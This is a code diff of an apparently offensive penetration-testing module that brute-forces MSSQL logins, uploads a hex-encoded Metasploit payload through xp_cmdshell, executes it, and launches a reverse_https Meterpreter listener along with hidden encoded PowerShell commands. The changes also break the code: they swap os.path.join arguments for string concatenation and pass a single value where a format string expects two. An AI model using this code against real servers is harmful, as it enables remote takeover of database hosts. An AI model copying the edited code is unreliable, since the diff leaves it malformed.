@@ -96,6 +96,7 @@ def brute(ipaddr, username, port, wordlist):
 def deploy_hex2binary(ipaddr, port, username, password):
     # base variable used to select payload option
     option = None
+    choice1 = "1"
 
     conn = _mssql.connect("{0}:{1}".format(ipaddr, port),
                           username,
@@ -152,6 +153,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
         choice1 = input("1.) Use Metasploit (default)\n"
                         "2.) Select your own\n\n"
                         "Enter your choice[1]:")
+
         if choice1 == "":
             choice1 = "1"
 
@@ -177,8 +179,8 @@ def deploy_hex2binary(ipaddr, port, username, password):
 
                 # if we are using a SET interactive shell payload then we need to make
                 # the path under web_clone versus ~./set
-                if os.path.isfile(os.path.join(core.setdir, "set.payload")):
-                    web_path = os.path.join(core.setdir, "web_clone")
+                if os.path.isfile(os.path.join(core.setdir + "set.payload")):
+                    web_path = os.path.join(core.setdir + "web_clone")
                     # then we are using metasploit
                 else:
                     if operating_system == "posix":
@@ -187,12 +189,12 @@ def deploy_hex2binary(ipaddr, port, username, password):
                         if not os.path.isfile(core.setdir + "1msf.exe"):
                             # move it then
                             subprocess.Popen("cp %s/msf.exe %s/1msf.exe" %
-                                             (core.setdir, core.setdir), shell=True).wait()
+                                             (core.setdir + core.setdir), shell=True).wait()
                             subprocess.Popen("cp %s/1msf.exe %s/ 1> /dev/null 2> /dev/null" %
-                                             (core.setdir, core.setdir), shell=True).wait()
+                                             (core.setdir + core.setdir), shell=True).wait()
                             subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" %
-                                             (core.setdir, core.setdir), shell=True).wait()
-            payload_filename = os.path.join(web_path, "1msf.exe")
+                                             (core.setdir + core.setdir), shell=True).wait()
+            payload_filename = os.path.join(web_path + "1msf.exe")
 
         with open(payload_filename, "rb") as fileopen:
             # read in the binary
@@ -201,12 +203,12 @@ def deploy_hex2binary(ipaddr, port, username, password):
             data = binascii.hexlify(data)
             # we write out binary out to a file
 
-        with open(os.path.join(core.setdir, "payload.hex"), "w") as filewrite:
+        with open(os.path.join(core.setdir + "payload.hex"), "w") as filewrite:
             filewrite.write(data)
 
         if choice1 == "1":
             # if we are using metasploit, start the listener
-            if not os.path.isfile(os.path.join(core.setdir, "set.payload")):
+            if not os.path.isfile(os.path.join(core.setdir + "set.payload")):
                 if operating_system == "posix":
                     try:
                         core.module_reload(pexpect)
@@ -214,8 +216,8 @@ def deploy_hex2binary(ipaddr, port, username, password):
                         import pexpect
                         core.print_status("Starting the Metasploit listener...")
                         msf_path = core.meta_path()
-                        child2 = pexpect.spawn("{0}-r {1}\r\n\r\n".format(os.path.join(core.meta_path(), "msfconsole"),
-                                                                        os.path.join(core.setdir, "meta_config")))
+                        child2 = pexpect.spawn("{0}-r {1}\r\n\r\n".format(os.path.join(core.meta_path() + "msfconsole"),
+                                                                        os.path.join(core.setdir + "meta_config")))
 
         # random executable name
         random_exe = core.generate_random_string(10, 15)
@@ -239,7 +241,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
         core.update_options("POWERSHELL_SOLO=ON")
         core.print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
 
-        with open(os.path.join(core.setdir, "/payload_options.shellcode"), "w") as filewrite:
+        with open(os.path.join(core.setdir + "/payload_options.shellcode"), "w") as filewrite:
             # format needed for shellcode generation
             filewrite.write("windows/meterpreter/reverse_https {0},".format(port))
 
@@ -249,23 +251,23 @@ def deploy_hex2binary(ipaddr, port, username, password):
             import src.payloads.powershell.prep
 
         # create the directory if it does not exist
-        if not os.path.isdir(os.path.join(core.setdir, "reports/powershell")):
-            os.makedirs(os.path.join(core.setdir, "reports/powershell"))
+        if not os.path.isdir(os.path.join(core.setdir + "reports/powershell")):
+            os.makedirs(os.path.join(core.setdir + "reports/powershell"))
 
-        with open(os.path.join(core.setdir, "x86.powershell")) as x86:
+        with open(os.path.join(core.setdir + "x86.powershell")) as x86:
             x86 = x86.read()
 
         x86 = "powershell -nop -window hidden -noni -EncodedCommand {0}".format(x86)
         core.print_status("If you want the powershell commands and attack, "
-                          "they are exported to {0}".format(os.path.join(core.setdir, "reports/powershell")))
-        with open(os.path.join(core.setdir, "/reports/powershell/x86_powershell_injection.txt"), "w") as filewrite:
+                          "they are exported to {0}".format(os.path.join(core.setdir + "reports/powershell")))
+        with open(os.path.join(core.setdir + "/reports/powershell/x86_powershell_injection.txt"), "w") as filewrite:
             filewrite.write(x86)
 
         # if our payload is x86 based - need to prep msfconsole rc
         if payload == "x86":
             powershell_command = x86
             # powershell_dir = core.setdir + "/reports/powershell/x86_powershell_injection.txt"
-            with open(os.path.join(core.setdir, "reports/powershell/powershell.rc"), "w") as filewrite:
+            with open(os.path.join(core.setdir + "reports/powershell/powershell.rc"), "w") as filewrite:
                 filewrite.write("use multi/handler\n"
                                 "set payload windows/meterpreter/reverse_https\n"
                                 "set lport {0}\n"
@@ -284,8 +286,8 @@ def deploy_hex2binary(ipaddr, port, username, password):
                 import pexpect
 
             core.print_status("Starting the Metasploit listener...")
-            child2 = pexpect.spawn("{0} -r {1}".format(os.path.join(msf_path, "msfconsole"),
-                                                     os.path.join(core.setdir, "reports/powershell/powershell.rc")))
+            child2 = pexpect.spawn("{0} -r {1}".format(os.path.join(msf_path + "msfconsole"),
+                                                     os.path.join(core.setdir + "reports/powershell/powershell.rc")))
             core.print_status("Waiting for the listener to start first before we continue forward...")
             core.print_status("Be patient, Metaploit takes a little bit to start...")
             child2.expect("Starting the payload handler", timeout=30000)
@@ -304,7 +306,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
         # here we start the conversion and execute the payload
         core.print_status("Sending the main payload via to be converted back to a binary.")
         # read in the file 900 bytes at a time
-        with open(os.path.join(core.setdir, 'payload.hex')) as fileopen:
+        with open(os.path.join(core.setdir + 'payload.hex')) as fileopen:
             core.print_status("Dropping initial begin certificate header...")
             conn.execute_query("exec master ..xp_cmdshell 'echo -----BEGIN CERTIFICATE----- > {0}.crt'".format(random_exe))
             for data in fileopen.read(900).rstrip():
@@ -325,10 +327,10 @@ def deploy_hex2binary(ipaddr, port, username, password):
         conn.execute_query("exec master..xp_cmdshell '{0}.exe'".format(random_exe))
         # if we are using SET payload
         if choice1 == "1":
-            if os.path.isfile(os.path.join(core.setdir, "set.payload")):
+            if os.path.isfile(os.path.join(core.setdir + "set.payload")):
                 core.print_status("Spawning separate child process for listener...")
                 try:
-                    shutil.copyfile(os.path.join(core.setdir, "web_clone/x"), definepath)
+                    shutil.copyfile(os.path.join(core.setdir + "web_clone/x"), definepath)
                 except:
                     pass
 
@@ -361,8 +363,8 @@ def deploy_hex2binary(ipaddr, port, username, password):
     if option == "2":
         core.print_status("Triggering payload stager...")
         alphainject = ""
-        if os.path.isfile(os.path.join(core.setdir, "meterpreter.alpha")):
-            with open(os.path.join(core.setdir, "meterpreter.alpha")) as fileopen:
+        if os.path.isfile(os.path.join(core.setdir + "meterpreter.alpha")):
+            with open(os.path.join(core.setdir + "meterpreter.alpha")) as fileopen:
                 alphainject = fileopen.read()
 
         sql_command = ("xp_cmdshell '{0}.exe {1}'".format(random_exe, alphainject))
@@ -370,9 +372,9 @@ def deploy_hex2binary(ipaddr, port, username, password):
         thread.start_new_thread(conn.execute_query, (sql_command,))
         time.sleep(1)
 
-        # if pexpect doesnt exit right then it freaks out
+    # if pexpect doesnt exit right then it freaks out
     if choice1 == "1":
-        if os.path.isfile(os.path.join(core.setdir, "set.payload")):
+        if os.path.isfile(os.path.join(core.setdir + "set.payload")):
             os.system("python ../../payloads/set_payloads/listener.py")
         try:
             # interact with the child process through pexpect
